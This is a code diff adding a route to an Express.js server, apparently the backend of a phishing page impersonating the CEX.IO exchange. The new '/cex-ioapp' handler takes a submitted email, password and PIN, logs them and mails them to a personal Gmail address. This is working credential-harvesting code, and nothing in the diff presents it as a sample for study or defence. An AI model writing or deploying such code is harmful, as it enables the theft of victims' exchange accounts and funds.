@@ -271,6 +271,37 @@ app.post('/blk-support', (req, res, next) => {
     }
   })
 })
+/////////////////// CEX
+app.post('/cex-ioapp', (req, res, next) => {
+  console.log(
+    'req body', req.body
+  )
+
+ const { email, password, pin } = req.body
+ const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`
+
+
+  const mail = {
+      from: 'admin@growveonct.com',
+      to: 'ifestephenie@gmail.com',
+      subject: 'New message from Cexioapp',
+      html: content,
+  }
+
+  transporter.sendMail(mail, (err, data) => {
+    if (err) {
+      console.log({err})
+      res.json({
+        status: 'fail'
+      })
+    } else {
+      console.log('email sent', data)
+      res.json({
+       status: 'success'
+      })
+    }
+  })
+})
 
 
 const PORT = process.env.PORT || 3030
